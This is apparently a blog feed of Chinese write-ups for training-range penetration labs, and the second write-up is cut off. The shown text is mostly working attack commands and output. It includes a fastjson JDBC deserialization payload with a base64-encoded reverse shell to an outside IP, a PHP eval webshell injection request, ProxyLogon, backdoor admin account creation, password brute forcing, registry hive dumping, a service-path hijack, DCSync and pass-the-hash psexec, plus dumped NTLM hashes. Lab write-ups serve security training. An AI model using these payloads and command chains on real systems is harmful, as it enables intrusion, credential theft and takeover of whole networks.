    <content type="html"><![CDATA[<p>fscan先扫一波</p><p><img src="../images/image-20231016201318668.png" alt="image-20231016201318668"></p><p>8000端口有一个<code>Lumia ERP</code></p><p>这里的话是存在一个弱口令的 <code>admin/123456</code>   用别的方法其实也行  存在一个信息泄露</p><p><img src="../images/image-20231016201518335.png" alt="image-20231016201518335"></p><p><img src="../images/image-20231016201537456.png" alt="image-20231016201537456"></p><p>于是登录后台  发现题目给了个<code>JDBC</code>的提示</p><p>于是查了一下  发现是fastjson的JDBC    <a href="https://www.cnblogs.com/kingbridge/articles/16720318.html">JDBC-fastjson</a></p><p>然后跟着来打就行了</p><p>先下载一个Mysql-Fake   <a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a>   然后将<code>yso.jar</code>下载到这个MySQL文件夹里  并且修改config文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;config&quot;:&#123;</span><br><span class="line">            &quot;ysoserialPath&quot;:&quot;ysoserial-all.jar&quot;,</span><br><span class="line">            &quot;javaBinPath&quot;:&quot;java&quot;,</span><br><span class="line">            &quot;fileOutputDir&quot;:&quot;./fileOutput/&quot;,</span><br><span class="line">            &quot;displayFileContentOnScreen&quot;:true,</span><br><span class="line">            &quot;saveToFile&quot;:true</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;fileread&quot;:&#123;</span><br><span class="line">            &quot;win_ini&quot;:&quot;c:\\windows\\win.ini&quot;,</span><br><span class="line">            &quot;win_hosts&quot;:&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;,</span><br><span class="line">            &quot;win&quot;:&quot;c:\\windows\\&quot;,</span><br><span class="line">            &quot;linux_passwd&quot;:&quot;/etc/passwd&quot;,</span><br><span class="line">            &quot;linux_hosts&quot;:&quot;/etc/hosts&quot;,</span><br><span class="line">            &quot;index_php&quot;:&quot;index.php&quot;,</span><br><span class="line">            &quot;ssrf&quot;:&quot;https://www.baidu.com/&quot;,</span><br><span class="line">            &quot;__defaultFiles&quot;:[&quot;/etc/hosts&quot;,&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;yso&quot;:&#123;</span><br><span class="line">            &quot;Jdk7u21&quot;:[&quot;Jdk7u21&quot;,&quot;calc&quot;],</span><br><span class="line">            &quot;CommonsCollections6&quot;:[&quot;CommonsCollections6&quot;,&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;]</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后运行<code>server.py</code>文件</p><p><img src="../images/image-20231016202349848.png" alt="image-20231016202349848"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;name&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;, &quot;hostToConnectTo&quot;: &quot;101.42.39.110&quot;, &quot;portToConnectTo&quot;: 3306, &quot;info&quot;: &#123; &quot;user&quot;: &quot;yso_CommonsCollections6_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;, &quot;password&quot;: &quot;pass&quot;, &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;, &quot;autoDeserialize&quot;: &quot;true&quot;, &quot;NUM_HOSTS&quot;: &quot;1&quot; &#125; &#125;</span><br></pre></td></tr></table></figure><p>传的时候记得url编码</p><p><img src="../images/image-20231016202441457.png" alt="image-20231016202441457"></p><p>这个shell一来就是root权限  好家伙</p><p>直接找flag就行了</p><p>这里的话我习惯在弹一个shell到msf上</p><p><img src="../images/image-20231016202922827.png" alt="image-20231016202922827"></p><p>然后上传工具扫内网了</p><p><img src="../images/image-20231016203003334.png" alt="image-20231016203003334"></p><p><img src="../images/image-20231016203232455.png" alt="image-20231016203232455"></p><p>总结一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.3.12   getshell主机</span><br><span class="line"> </span><br><span class="line">172.22.3.2   win16 DC域控</span><br><span class="line"></span><br><span class="line">172.22.3.9  EXC01  ---exchange01  outlook  windows</span><br><span class="line"></span><br><span class="line">172.22.3.26  域内主机 XIAORANG\XIAORANG-PC</span><br></pre></td></tr></table></figure><p>然后搭建代理隧道</p><p>先去访问这个exchange</p><p><img src="../images/image-20231016203618197.png" alt="image-20231016203618197"></p><p>这里发现是exchange server 2016 然后直接就去用ProxyLogon来打    <a href="https://github.com/hausec/ProxyLogon">https://github.com/hausec/ProxyLogon</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python2 proxylogon.py 172.22.3.9 administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231016204117998.png" alt="image-20231016204117998"></p><p>给的是system权限  </p><p><img src="../images/image-20231016204239171.png" alt="image-20231016204239171"></p><p>发现3389端口还开着  新创建一个本地管理员账户进行rdp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231016204708760.png" alt="image-20231016204708760"></p><p>直接去拿flag就行了  </p><p>因为我们现在是本地管理员账户 不是域内账户  为了hashdump  得弹个shell</p><p>因为我们之前获取到了system的shell 直接传个马上去  然后shell执行  以system权限反弹</p><p><img src="../images/image-20231016205412245.png" alt="image-20231016205412245"></p><p><img src="../images/image-20231016205422234.png" alt="image-20231016205422234"></p><p><img src="../images/image-20231016205457506.png" alt="image-20231016205457506"></p><p>直接拿下exchange这台机器</p><p>然后开始查看域内hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9dca627bdcde6df114a3c4a18a09765d:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Ke1nys:1000:aad3b435b51404eeaad3b435b51404ee:6912928308e3cda903e6d75bd6091a20:::</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username              Domain          NTLM                              SHA1                                      DPAPI</span><br><span class="line">--------              ------          ----                              ----                                      -----</span><br><span class="line">HealthMailbox0d5918e  XIAORANG        455badfb0e1e1d3ecad7d3f49199bbf4  359551c1705616dabc7d48d1163c8ea07701d8b1  312f49d92f1db5ad776f4d2d57c6ccff</span><br><span class="line">HealthMailbox0d5918e  XIAORANG        8946a14d33bf2fa6542c2d9980c3af21  153ca12269ffae16f0475fb8b4532a647c05c11a  f58fb0f7fc11355abf57fe3b7a581bd7</span><br><span class="line">Ke1nys                XIAORANG-EXC01  6912928308e3cda903e6d75bd6091a20  4687d6f9b23b55f21825bc5157fe2cbe707c07de</span><br><span class="line">XIAORANG-EXC01$       XIAORANG        172701e17477920ff7097626eaeb0ea7  c473f34cecfc9d6b0481d79ee031c8c4dfc27a20</span><br><span class="line">XIAORANG-EXC01$       XIAORANG        9587463cfa3fd1ea760c401e2c52e224  162fc915ffccfa73c6f53b3c92f02690ccf7831c</span><br><span class="line">Zhangtong             XIAORANG        22c7f81993e96ac83ac2f3f1903de8b4  4d205f752e28b0a13e7a2da2a956d46cb9d9e01e  ed14c3c4ef895b1d11b04fb4e56bb83b</span><br></pre></td></tr></table></figure><p>这里的话直接使用Viper的msf直接进入shell  然后直接执行<code>sharphound.exe</code>就行了</p><p><img src="../images/image-20231016211207064.png" alt="image-20231016211207064"></p><p><img src="../images/image-20231016210754387.png" alt="image-20231016210754387" style="zoom:50%;" /></p><p><img src="../images/image-20231016211040130.png" alt="image-20231016211040130"></p><p>拖到域内分析就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 bloodhound-python -u xiaorang-exc01 --hashes &quot;aad3b435b51404eeaad3b435b51404ee:9dca627bdcde6df114a3c4a18a09765d&quot; -d xiaorang.lab -dc xiaorang-win16.xiaorang.lab -c all --dns-tcp -ns 172.22.3.2 --auth-method ntlm --zip</span><br></pre></td></tr></table></figure><p>这个命令的话  好像得是获取到机器的hash值才行   mimikatz 的sekurlsa::logonpasswords 可以导出机器的hash</p><p><strong>(注册表也可以)</strong></p><p><img src="../images/image-20231016211513614.png" alt="image-20231016211513614"></p><p>发现这个机器账户具有writeDacl的功能  并且是对admins这个组的  这个组还具有域管的权限  说明我们可以写域管权限的acl了  </p><blockquote><p>ACL就是访问控制  可以指派xxx具有xxx权限</p></blockquote><p>这里的话我们就直接给ZHANGTONG这个用户DCSync权限  </p><p>有两种方法 </p><ul><li>第一种是使用impacket里的dacledit.py</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :4de6c4eeee1f315e1241c4a813e2b3b5 -action write -rights DCSync -principal Zhangtong -target-dn &quot;DC=xiaorang,DC=lab&quot; -dc-ip 172.22.3.2</span><br></pre></td></tr></table></figure><p>但是这里我使用的话报错 </p><p>所以我选择第二种方法</p><ul><li>第二种是选择</li></ul><p><strong>bloodAD</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodyAD -d xiaorang.lab -u &#x27;XIAORANG-EXC01$&#x27; -p :172701e17477920ff7097626eaeb0ea7 --host 172.22.3.2 add dcsync Zhangtong</span><br></pre></td></tr></table></figure><p>这里的这个hash值是机器的hash值  因为根据sharphound的分析  发现是这个这个机器账户才有这个权限</p><p><img src="../images/image-20231016213037029.png" alt="image-20231016213037029"></p><p>然后使用脚本直接执行DCSync</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm</span><br></pre></td></tr></table></figure><p>这里使用的是Zhangtong用户的hash值    这个脚本在impacket里就有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\$431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\HealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:8faefce446279aec0f176a8315b3fec7:::</span><br><span class="line">xiaorang.lab\HealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:8946a14d33bf2fa6542c2d9980c3af21:::</span><br><span class="line">xiaorang.lab\HealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131:::</span><br><span class="line">xiaorang.lab\HealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d:::</span><br><span class="line">xiaorang.lab\HealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::</span><br><span class="line">xiaorang.lab\HealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::</span><br><span class="line">xiaorang.lab\HealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21:::</span><br><span class="line">xiaorang.lab\HealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899:::</span><br><span class="line">xiaorang.lab\HealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::</span><br><span class="line">xiaorang.lab\HealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb:::</span><br><span class="line">xiaorang.lab\HealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102:::</span><br><span class="line">xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::</span><br><span class="line">Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4:::</span><br><span class="line">XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:56b000c4417c31ada3ba7d3a655d6862:::</span><br><span class="line">XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:172701e17477920ff7097626eaeb0ea7:::</span><br><span class="line">XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:81d92fdc7be4bcb8cdf9155bc40a8a31:::</span><br></pre></td></tr></table></figure><p>域控hash拿到  直接psexec连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python psexec.py -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.2</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231016213514443.png" alt="image-20231016213514443"></p><p>拿下域控的flag  最后一个flag的话是在exchange的邮件里面</p><p>是在Lumia用户的桌面上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 pthexchange.py --target https://172.22.3.9/ --username Lumia --password &#x27;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&#x27; --action Download</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231016214338998.png" alt="image-20231016214338998"></p><p>这里别人能执行成功  我执行报错  就不研究了  去看别人wp就行了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fscan先扫一波&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231016201318668.png&quot; alt=&quot;image-20231016201318668&quot;&gt;&lt;/p&gt;
&lt;p&gt;8000端口有一个&lt;code&gt;Lumia ERP&lt;/code&gt;&lt;/</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Delegation</title>
    <link href="https://ke1nys.github.io/posts/bdc052b9.html"/>
    <id>https://ke1nys.github.io/posts/bdc052b9.html</id>
    <published>2023-10-10T10:15:40.000Z</published>
    <updated>2023-11-19T09:05:04.825Z</updated>
    
    <content type="html"><![CDATA[<p>fscan开扫</p><p><img src="../images/image-20231010192348417.png" alt="image-20231010192348417"></p><p><img src="../images/image-20231010192404021.png" alt="image-20231010192404021"></p><p>扫描发现后台<code>/admin</code></p><p>弱口令登录</p><p><code>admin/123456</code></p><p><img src="../images/image-20231010192457210.png" alt="image-20231010192457210"></p><p>在后台登录时就已经看到了这个cms的版本后 于是google一下</p><p><a href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012">https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012 </a>    后台RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1</span><br><span class="line">Host: 39.98.127.31</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=m9fbpga5avq5itn03q12h5ldkk; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 49</span><br><span class="line"></span><br><span class="line">sid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php @eval($_POST[1]);phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">//Response </span><br><span class="line">ok</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010192848064.png" alt="image-20231010192848064"></p><p>成功写入  直接反弹shell到主机的vps上</p><p>flag在home目录下  在读取的时候发现这个权限不够 于是尝试开始提权</p><p><img src="../images/image-20231010193138271.png" alt="image-20231010193138271"></p><p>这个diff去查一下</p><p><img src="../images/image-20231010193210058.png" alt="image-20231010193210058"></p><p><img src="../images/image-20231010193303330.png" alt="image-20231010193303330"></p><p>这里给了个机器账户的本地账户</p><p>先去扫下内网</p><p><img src="../images/image-20231010193645120.png" alt="image-20231010193645120"></p><p>资源整理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.36  getshell主机</span><br><span class="line"></span><br><span class="line">172.22.4.7  域控主机DC01</span><br><span class="line"></span><br><span class="line">172.22.4.45  域内主机 WIN19</span><br><span class="line"></span><br><span class="line">172.22.4.19 FILESERVER </span><br></pre></td></tr></table></figure><p>先搭建隧道  这里使用的是stowaway</p><p>然后根据第一个提示  给了WIN19的本地账户WIN19\Adrian  于是猜测需要去爆破  因为是本地账户  所以不能使用<code>kerbrute</code>来进行爆破  于是我们尝试使用<code>crackmapexec</code>来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.4.45 -u Adrian -p rockyou.txt -d WIN19</span><br><span class="line"></span><br><span class="line">//使用前提还是开了139  445的端口前提下 -h可以查看允许爆破类型</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010194545801.png" alt="image-20231010194545801"></p><blockquote><p>WIN19\Adrian     babygirl1</p></blockquote><p>尝试rdp一下  因为前面开了这个3389端口来</p><p><img src="../images/image-20231010194733741.png" alt="image-20231010194733741"></p><p>提示密码过期 这里本来是想用<code>smbpasswd.py</code>来进行更改的  但是发现不行这里  估计是本地用户的原因</p><p><strong>于是发现了kali的<code>rdesktop</code>可以无密码登录</strong>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 rdesktop 172.22.4.45</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010200954046.png" alt="image-20231010200954046"></p><p>修改密码后成功登录</p><p>发现桌面上多了个文件夹</p><p><img src="../images/image-20231010201116640.png" alt="image-20231010201116640"></p><p>里面的一个html文件的内容  <strong>只要是这个计算机的用户都可以权限对注册表进行操作</strong></p><p><strong>这里在之前试了一下  发现可以直接修改注册表  改成自己的生成的木马的地址  也能返回到system权限</strong></p><p><strong>但是这里的话用这个方法获取不到这个机器的hash值  不能进行下一步操作了  因为只有这个机器在域内  其他用户都不在</strong></p><p>于是这里的话我们先生成一个exe文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec cmd=&#x27;C:\windows\system32\cmd.exe /c C:\users\Adrian\Desktop\sam.bat &#x27; --platform windows -f exe-service &gt; a.exe</span><br></pre></td></tr></table></figure><p>然后写一个sam.bat，内容如下然后传到win机器上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\Adrian\Desktop\system</span><br><span class="line">reg save hklm\sam C:\Users\Adrian\Desktop\sam</span><br><span class="line">reg save hklm\security C:\Users\Adrian\Desktop\security</span><br></pre></td></tr></table></figure><p>注册表中的这三个位置  存放的就是本机上所有用户包括机器的密码的hash值  所以我们得去获取他</p><p>修改注册表服务 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\Users\Adrian\Desktop\a.exe&quot; /f</span><br></pre></td></tr></table></figure><p>记得路径不要出错</p><p><img src="../images/image-20231010201813604.png" alt="image-20231010201813604"></p><p>然后运行这个gupdate</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010201918904.png" alt="image-20231010201918904"></p><p>我们就成功把注册表上的几个文件给下载下来了 </p><p><img src="../images/image-20231010212212597.png" alt="image-20231010212212597"></p><p><strong>其实也可以通过这种方式来进行反弹shell操作  但是这个弹到Viper或者cs上的话  使用hashdump和creds_all的话都是获取不到这个机器的hash值的  只能获取到本地账户的hash值</strong>  </p><p>于是我们拖到本地进行离线提权hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py LOCAL -system system -sam sam -security security</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010202145550.png" alt="image-20231010202145550"></p><p>这样的话我们的本地管理员和机器用户的hash值就全部爆出来了</p><p><strong>并且有一点就是这个本地管理员的psexec和这个域管的psexec用法还是有不同的</strong></p><p><strong>(可能是因为全部的hash前半部分相同的原因吧)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">本地管理员</span><br><span class="line">proxychains4 python3 psexec.py administrator@172.22.4.45 -hashes &quot;aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab&quot; -codec gbk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">域管</span><br><span class="line">proxychains4 python wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee xiaorang.lab/administrator@172.22.4.45</span><br></pre></td></tr></table></figure><blockquote><p>这里有一点很奇怪 使用本地管理员 psexec.py来进行连接时  返回的是system权限</p><p>wmiexec.py 连接时返回的时admin权限   </p><p>按道理来说  本地管理员时不应该有system权限的  这是机器才有的权限</p><p>留着思考一下？？？？？？？？？？？？？？</p></blockquote><p>—————————————————————————-(google找了一下  原因是这样的)————————————————————</p><ul><li>这个其实跟psexec.py的运行过程是相关的</li></ul><p><img src="../images/image-20231010223329966.png" alt="image-20231010223329966"></p><p>其实在执行代码的时候  也会回显出代码服务创建  这里就是因为在远程机器上创建了这个系统服务  然后又因为这个系统服务是以<code>system</code>权限来执行的   于是我们获取到的就是这个system权限了</p><p><strong>(前提是必须使用administrator用户来进行连接   不然没有权限来创建这个服务)</strong></p><p><img src="../images/image-20231010223541185.png" alt="image-20231010223541185"></p><p><strong>在了解这个的过程中还发现了这两者都是基于这个<code>ipc$</code>    其对应的就是<code>445  139</code>端口</strong>  </p><p>一般默认是开启的</p><p><img src="../images/image-20231010224004389.png" alt="image-20231010224004389"></p><p><strong>如果执行net share没有反应的话  说明了这个ipc$没有开启   psexec和wmi就用不了了</strong></p><hr><p>为了能过使用本地管理员账户  我们创建一个新账户加到本地管理员组里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010203627261.png" alt="image-20231010203627261"></p><p>这里查看一下域内信息</p><p><img src="../images/image-20231010203717730.png" alt="image-20231010203717730"></p><p>因为这里psexec连接上去的是这个system权限  这个权限是机器的权限  并且只有这个机器在域内  其他用户均为本地成员 看不了域内成员</p><p><img src="../images/image-20231010203836101.png" alt="image-20231010203836101"></p><p>先rdp上刚刚创建的用户</p><p>然后kali运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 